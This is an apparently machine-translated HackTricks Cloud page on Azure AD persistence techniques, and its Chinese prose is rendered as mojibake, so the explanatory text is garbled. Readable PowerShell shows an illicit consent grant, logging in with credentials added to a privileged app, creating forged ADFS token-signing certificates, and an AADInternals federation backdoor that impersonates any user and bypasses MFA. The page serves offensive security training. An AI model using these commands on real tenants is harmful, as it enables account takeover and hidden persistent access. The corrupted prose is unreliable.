# Az - æŒä¹…æ€§

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

### éæ³•åŒæ„æˆæƒ

é»˜è®¤æƒ…å†µä¸‹ï¼Œä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥åœ¨ Azure AD ä¸­æ³¨å†Œåº”ç”¨ç¨‹åºã€‚å› æ­¤ï¼Œæ‚¨å¯ä»¥æ³¨å†Œä¸€ä¸ªéœ€è¦é«˜å½±å“æƒé™çš„åº”ç”¨ç¨‹åºï¼ˆä»…é’ˆå¯¹ç›®æ ‡ç§Ÿæˆ·ï¼‰ï¼Œå¹¶è·å¾—ç®¡ç†å‘˜åŒæ„ï¼ˆå¦‚æœæ‚¨æ˜¯ç®¡ç†å‘˜åˆ™æ‰¹å‡†ï¼‰â€”â€”ä¾‹å¦‚ä»£è¡¨ç”¨æˆ·å‘é€é‚®ä»¶ã€è§’è‰²ç®¡ç†ç­‰ã€‚è¿™å°†ä½¿æˆ‘ä»¬èƒ½å¤Ÿ**æ‰§è¡Œç½‘ç»œé’“é±¼æ”»å‡»**ï¼Œå¦‚æœæˆåŠŸå°†éå¸¸**æœ‰åˆ©**ã€‚

æ­¤å¤–ï¼Œæ‚¨è¿˜å¯ä»¥ä»¥æ‚¨çš„ç”¨æˆ·èº«ä»½æ¥å—è¯¥åº”ç”¨ç¨‹åºï¼Œä»¥ä¿æŒå¯¹å…¶çš„è®¿é—®ã€‚

### åº”ç”¨ç¨‹åºå’ŒæœåŠ¡ä¸»ä½“

æ‹¥æœ‰åº”ç”¨ç¨‹åºç®¡ç†å‘˜ã€GA æˆ–å…·æœ‰ microsoft.directory/applications/credentials/update æƒé™çš„è‡ªå®šä¹‰è§’è‰²çš„æƒé™ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æœ‰åº”ç”¨ç¨‹åºæ·»åŠ å‡­æ®ï¼ˆå¯†é’¥æˆ–è¯ä¹¦ï¼‰ã€‚

å¯ä»¥**é’ˆå¯¹å…·æœ‰é«˜æƒé™çš„åº”ç”¨ç¨‹åº**æˆ–**æ·»åŠ å…·æœ‰é«˜æƒé™çš„æ–°åº”ç”¨ç¨‹åº**ã€‚

ä¸€ä¸ªæœ‰è¶£çš„è§’è‰²æ˜¯**ç‰¹æƒèº«ä»½éªŒè¯ç®¡ç†å‘˜è§’è‰²**ï¼Œå› ä¸ºå®ƒå…è®¸**é‡ç½®å…¨å±€ç®¡ç†å‘˜çš„å¯†ç **ã€‚

è¯¥æŠ€æœ¯è¿˜å…è®¸**ç»•è¿‡ MFA**ã€‚

{% code overflow="wrap" %}
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
{% endcode %}

* å¯¹äºåŸºäºè¯ä¹¦çš„èº«ä»½éªŒè¯

{% code overflow="wrap" %}
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
{% endcode %}

### è”é‚¦ - ä»¤ç‰Œç­¾åè¯ä¹¦

åœ¨æœ¬åœ° AD ä¸Šæ‹¥æœ‰ **DA æƒé™**ï¼Œå¯ä»¥åˆ›å»ºå’Œå¯¼å…¥æœ‰æ•ˆæœŸéå¸¸é•¿çš„ **æ–°ä»¤ç‰Œç­¾å** å’Œ **ä»¤ç‰Œè§£å¯†è¯ä¹¦**ã€‚è¿™å°†å…è®¸æˆ‘ä»¬ **ä»¥ä»»ä½•ç”¨æˆ·èº«ä»½ç™»å½•**ï¼Œåªè¦æˆ‘ä»¬çŸ¥é“ä»–ä»¬çš„ ImuutableIDã€‚

**åœ¨ ADFS æœåŠ¡å™¨ä¸Šä»¥ DA èº«ä»½è¿è¡Œ**ä»¥ä¸‹å‘½ä»¤ä»¥åˆ›å»ºæ–°è¯ä¹¦ï¼ˆé»˜è®¤å¯†ç  'AADInternals'ï¼‰ï¼Œå°†å…¶æ·»åŠ åˆ° ADFSï¼Œç¦ç”¨è‡ªåŠ¨æ»šåŠ¨å¹¶é‡å¯æœåŠ¡ï¼š
```powershell
New-AADIntADFSSelfSignedCertificates
```
ç„¶åï¼Œä½¿ç”¨ Azure AD æ›´æ–°è¯ä¹¦ä¿¡æ¯ï¼š
```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```
### Federation - Trusted Domain

åœ¨ç§Ÿæˆ·ä¸Šæ‹¥æœ‰ GA æƒé™æ—¶ï¼Œå¯ä»¥**æ·»åŠ ä¸€ä¸ªæ–°åŸŸ**ï¼ˆå¿…é¡»ç»è¿‡éªŒè¯ï¼‰ï¼Œå°†å…¶èº«ä»½éªŒè¯ç±»å‹é…ç½®ä¸ºè”é‚¦ï¼Œå¹¶å°†è¯¥åŸŸé…ç½®ä¸º**ä¿¡ä»»ç‰¹å®šè¯ä¹¦**ï¼ˆä»¥ä¸‹å‘½ä»¤ä¸­çš„ any.stsï¼‰å’Œé¢å‘è€…ï¼š
```powershell
# Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID

# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```
## å‚è€ƒ

* [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
